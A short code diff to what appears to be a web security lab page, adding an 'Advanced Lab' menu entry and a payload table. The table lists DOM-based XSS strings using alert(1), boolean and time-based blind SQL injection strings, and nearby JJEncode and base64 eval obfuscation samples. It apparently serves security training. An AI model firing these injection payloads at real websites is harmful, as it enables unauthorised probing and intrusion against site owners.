@@ -123,6 +123,7 @@
                     <option value="/">💬 XSS LAB</option>
                     <option value="/sqli">💉 SQL INJECTION</option>
                     <option value="/stealth">🛡️ EVASION LAB</option>
+		    <option value="/advanced">🧪 ADVANCED LAB</option>
                 </select>
                 <button class="btn btn-purple btn-full" onclick="openTool()">GO TO PAGE</button>
             </div>
@@ -194,6 +195,16 @@
                      "JJEncode": "$=~[];$={___:++$,$$$$:(![]+\"\")[$]};",
                      "Base64 Exec": "eval(atob('YWxlcnQoMSk='))"
                  }
+            },
+	    '/advanced': {
+                "title": "🧪 ADVANCED PAYLOADS",
+                "data": {
+                    "DOM XSS (Image)": "#<img src=x onerror=alert(1)>",
+                    "DOM XSS (Body)": "#<body onload=alert(1)>",
+                    "Blind SQL (True)": "admin' AND 1=1 --",
+                    "Blind SQL (False)": "admin' AND 1=2 --",
+                    "Blind Time-Based (Sleep)": "admin' AND randomblob(100000000) --" 
+                }
             }
         };
 
